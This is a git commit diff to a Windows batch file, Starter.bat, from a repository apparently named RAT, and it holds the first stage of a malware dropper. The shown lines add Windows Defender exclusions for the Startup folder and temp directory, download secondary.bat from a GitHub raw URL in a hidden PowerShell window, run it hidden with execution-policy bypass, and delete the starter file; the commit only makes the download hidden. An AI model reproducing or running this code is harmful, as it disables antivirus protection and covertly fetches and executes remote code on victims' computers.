a45287f727045bcd05fbb9b59ea3a89dec7564ff
saif <saif.aboueldahab@gmail.com>
2023-05-25 21:31:08 +0300

    sa

--- Starter.bat
+++ Starter.bat
@@ -27,7 +27,7 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
-curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
+powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat
 timeout 5
 powershell -windowstyle hidden -ep bypass ./secondary.bat
 del Starter.bat
